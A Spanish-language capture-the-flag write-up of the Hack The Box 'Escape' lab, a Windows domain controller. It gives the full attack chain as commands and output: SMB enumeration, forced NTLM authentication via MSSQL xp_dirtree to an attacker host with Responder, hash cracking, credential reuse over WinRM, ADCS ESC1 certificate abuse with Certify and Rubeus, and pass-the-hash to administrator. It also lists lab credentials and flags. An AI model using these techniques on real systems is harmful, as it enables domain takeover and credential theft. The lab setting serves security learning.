# HTB — Escape

**IP:** `10.129.228.253`  
**OS:** Windows Server 2019  
**Dificultad:** Medium  
**Dominio:** `sequel.htb`

---

## 1. Enumeración de Puertos

```bash
extractPorts allPorts
```

```
[*] IP Address: 10.129.228.253
[*] Open ports: 53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49679,49680,49700,49703
```

```bash
nmap -sV -sC -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49679,49680,49700,49703 10.129.228.253 -oN target
```

Resultados relevantes:
- **88** → Kerberos (dominio: `sequel.htb`)
- **389/636** → LDAP / LDAPS
- **445** → SMB
- **1433** → Microsoft SQL Server 2019 RTM
- **5985** → WinRM
- **DC Name:** `DC` | **DNS:** `dc.sequel.htb`

Agregamos el host a `/etc/hosts`:

```bash
sudo nano /etc/hosts
# 10.129.228.253  dc.sequel.htb sequel.htb
```

---

## 2. Enumeración SMB

```bash
crackmapexec smb 10.129.228.253 -u "" -p "" --shares
```

```
SMB  10.129.228.253  445  DC  [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb)
SMB  10.129.228.253  445  DC  [+] sequel.htb\: 
SMB  10.129.228.253  445  DC  [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

Probamos con `smbmap`:

```bash
smbmap -H 10.129.228.253 -u 'null'
```

```
Disk          Permissions   Comment
----          -----------   -------
ADMIN$        NO ACCESS     Remote Admin
C$            NO ACCESS     Default share
IPC$          READ ONLY     Remote IPC
NETLOGON      NO ACCESS     Logon server share
Public        READ ONLY     
SYSVOL        NO ACCESS     Logon server share
```

El share **Public** es de lectura. Lo exploramos:

```bash
smbclient --no-pass //10.129.228.253/Public
```

```
smb: \> ls
  SQL Server Procedures.pdf    A    49551  Fri Nov 18 13:39:43 2022
```

Descargamos el PDF:

```bash
smb: \> get "SQL Server Procedures.pdf"
```

> El PDF contiene credenciales para acceder al SQL Server:  
> **`PublicUser:GuestUserCantWrite1`**

---

## 3. Enumeración LDAP

```bash
# Obtener naming contexts
ldapsearch -x -H ldap://10.129.228.253 -s base namingcontexts
```

```
namingcontexts: DC=sequel,DC=htb
namingcontexts: CN=Configuration,DC=sequel,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=sequel,DC=htb
namingcontexts: DC=DomainDnsZones,DC=sequel,DC=htb
namingcontexts: DC=ForestDnsZones,DC=sequel,DC=htb
```

El LDAP anónimo no permite queries más profundas — requiere bind autenticado.

---

## 4. Acceso a MSSQL → Captura de Hash NTLMv2

Nos conectamos al SQL Server con las credenciales del PDF:

```bash
impacket-mssqlclient PublicUser:GuestUserCantWrite1@10.129.228.253
```

```
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
SQL (PublicUser  guest@master)>
```

Intentamos capturar el hash NTLM forzando una autenticación hacia nuestra máquina usando `xp_dirtree`. Primero levantamos Responder:

```bash
sudo responder -I tun0
```

Luego desde el cliente MSSQL:

```sql
EXEC xp_dirtree '\\10.10.14.163\share', 1, 1
```

Responder captura el hash:

```
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:1122334455667788:A2E4B52B...
```

Crackeamos el hash con hashcat:

```
SQL_SVC::sequel:...:REGGIE1234ronnie
```

> **Credenciales:** `sql_svc:REGGIE1234ronnie`

---

## 5. Acceso como sql_svc → Credenciales en ERRORLOG

Nos conectamos via WinRM:

```bash
evil-winrm -i 10.129.228.253 -u SQL_SVC -p 'REGGIE1234ronnie'
```

Explorando el sistema encontramos una carpeta de SQL Server:

```powershell
*Evil-WinRM* PS C:\SQLServer\logs> ls

    Directory: C:\SQLServer\logs

Mode        LastWriteTime    Length  Name
----        -------------    ------  ----
-a----  2/7/2023  8:06 AM   27608   ERRORLOG.BAK
```

Leemos el log:

```powershell
*Evil-WinRM* PS C:\SQLServer\logs> cat ERRORLOG.BAK
```

```
Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match...
Logon failed for user 'NuclearMosquito3'. Reason: Password did not match...
```

Alguien escribió la contraseña en el campo de usuario. 

> **Credenciales:** `Ryan.Cooper:NuclearMosquito3`

---

## 6. Acceso como Ryan.Cooper → User Flag

```bash
evil-winrm -i 10.129.228.253 -u Ryan.Cooper -p 'NuclearMosquito3'
```

```powershell
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> cat user.txt
e666d7bbc91f0861305924f24ffa5430
```

---

## 7. Escalada de Privilegios — ADCS ESC1

Subimos **Certify.exe** para enumerar templates de certificados vulnerables:

```powershell
*Evil-WinRM* PS C:\programdata> upload Certify.exe

*Evil-WinRM* PS C:\programdata> .\Certify.exe find /vulnerable /currentuser
```

Encontramos un template vulnerable:

```
[!] Vulnerable Certificates Templates :

    CA Name          : dc.sequel.htb\sequel-DC-CA
    Template Name    : UserAuthentication
    msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT   ← ESC1
    Enrollment Rights:
        sequel\Domain Users   ← cualquier usuario del dominio puede enrollar
```

El flag `ENROLLEE_SUPPLIES_SUBJECT` + enrollment para Domain Users = **ESC1**. Podemos solicitar un certificado en nombre de cualquier usuario, incluyendo `administrator`.

### Solicitar certificado como Administrator

```powershell
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
```

```
[*] CA Response : The certificate had been issued.
[*] cert.pem    :

-----BEGIN RSA PRIVATE KEY-----
...
-----END CERTIFICATE-----
```

### Convertir cert.pem a .pfx

En nuestra máquina copiamos el output (clave privada + certificado) a `cert.pem` y convertimos:

```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
# Enter Export Password: cisco123
```

### Subir cert.pfx y solicitar TGT + NTLM hash

Subimos `cert.pfx` y `Rubeus.exe`:

```powershell
*Evil-WinRM* PS C:\programdata> upload cert.pfx
*Evil-WinRM* PS C:\programdata> upload Rubeus.exe

*Evil-WinRM* PS C:\programdata> .\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap /password:cisco123
```

```
[*] Using PKINIT with etype rc4_hmac
[+] TGT request successful!

[*] Getting credentials using U2U

  CredentialInfo:
    NTLM : A52F78E4C751E5F5E17E1E9F3E58F4EE
```

> **NTLM hash de Administrator:** `A52F78E4C751E5F5E17E1E9F3E58F4EE`

---

## 8. Pass-the-Hash → Root Flag

```bash
evil-winrm -i 10.129.228.253 -u administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
ddb8bf2c23c1424a0ba0cc8d9028194b
```

---

## Resumen del Ataque

```
SMB anon (Public share)
        ↓
SQL Server Procedures.pdf → PublicUser:GuestUserCantWrite1
        ↓
MSSQL login → xp_dirtree → Responder captura hash NTLMv2
        ↓
Hashcat → sql_svc:REGGIE1234ronnie
        ↓
WinRM (sql_svc) → ERRORLOG.BAK → Ryan.Cooper:NuclearMosquito3
        ↓
WinRM (Ryan.Cooper) → user.txt ✅
        ↓
Certify → ESC1 (UserAuthentication template)
        ↓
Certify request /altname:administrator → cert.pem → cert.pfx
        ↓
Rubeus asktgt → NTLM hash de Administrator
        ↓
Evil-WinRM Pass-the-Hash → root.txt ✅
```

---

## Credenciales

| Usuario | Contraseña / Hash | Origen |
|---------|------------------|--------|
| PublicUser | GuestUserCantWrite1 | SQL Server Procedures.pdf |
| sql_svc | REGGIE1234ronnie | NTLMv2 hash crackeado |
| Ryan.Cooper | NuclearMosquito3 | ERRORLOG.BAK |
| Administrator | A52F78E4C751E5F5E17E1E9F3E58F4EE (NTLM) | ADCS ESC1 + Rubeus |